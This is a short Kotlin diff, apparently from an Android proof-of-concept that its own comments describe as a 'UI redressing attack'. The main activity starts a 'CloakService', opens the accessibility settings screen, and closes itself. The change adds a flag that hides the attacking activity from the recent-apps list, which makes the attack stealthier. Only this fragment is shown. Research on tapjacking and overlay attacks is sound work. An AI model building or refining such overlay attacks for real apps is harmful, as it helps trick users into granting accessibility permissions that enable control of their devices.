@@ -30,7 +30,8 @@ class MainActivity : AppCompatActivity() {
             // Start the cloak service to begin the UI redressing attack
             startService(Intent(this, CloakService::class.java))
             // Launch victim settings activity and close this activity.
-            val flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            val flags = Intent.FLAG_ACTIVITY_NEW_TASK or
+                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
             startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                     .setFlags(flags))
             finish()
